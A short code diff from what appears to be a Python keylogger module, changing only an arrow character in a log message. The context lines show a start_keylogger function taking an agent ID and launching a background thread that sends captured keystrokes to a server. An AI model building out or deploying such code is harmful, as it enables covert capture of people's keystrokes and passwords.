@@ -231,6 +231,6 @@ def start_keylogger(agent_id: str | None) -> Optional["keyboard.Listener"]:
     send_thread = threading.Thread(target=_send_to_server_loop, daemon=True)
     send_thread.start()
 
-    logger.info(f"Keylogger started → {KEYLOG_FILE}")
+    logger.info(f"Keylogger started -> {KEYLOG_FILE}")
 
     return listener
